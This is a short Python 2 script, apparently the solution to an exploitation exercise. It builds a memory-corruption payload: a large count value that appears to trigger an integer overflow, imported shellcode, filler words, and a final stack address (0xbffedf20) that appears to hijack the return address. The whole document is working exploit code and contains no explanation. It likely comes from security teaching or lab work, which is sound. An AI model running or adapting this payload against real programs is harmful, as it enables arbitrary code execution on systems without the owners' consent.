from shellcode import shellcode
from struct import pack
print pack("<I",0x40000001)+shellcode+'\x00'+pack("<I",0x00000001)+pack("<I",0x00000002)+pack("<I",0x00000003)+pack("<I",0x00000007)+pack("<I",0x00000008)+pack("<I",0x00000009)+pack("<I",0x0000000a)+pack("<I",0x0000000b)+pack("<I",0x0000000c)+pack("<I",0x0000000d)+pack("<I",0x0000000e)+pack("<I",0x0000000f)+pack("<I",0x00000001)+pack("<I",0xbffedf20)
